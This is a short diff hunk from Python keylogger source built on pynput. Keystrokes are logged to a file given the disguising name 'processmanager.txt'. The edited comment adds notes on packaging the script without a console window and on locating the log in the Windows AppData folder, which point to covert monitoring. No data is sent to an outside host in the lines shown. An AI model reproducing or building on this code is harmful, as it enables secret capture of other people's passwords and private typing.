@@ -3,7 +3,7 @@ from pynput.keyboard import Listener
 
 keys = []
 count = 0
-# path = os.environ['appdata'] + '\\processmanager.txt' #for windows
+# path = os.environ['appdata'] + '\\processmanager.txt' #for windows | python3 key.py --onefile --noconsole, cd AppData, cd Roaming, dir, type processmanager.txt
 path = 'processmanager.txt' #for linux
 
 def on_press(key):
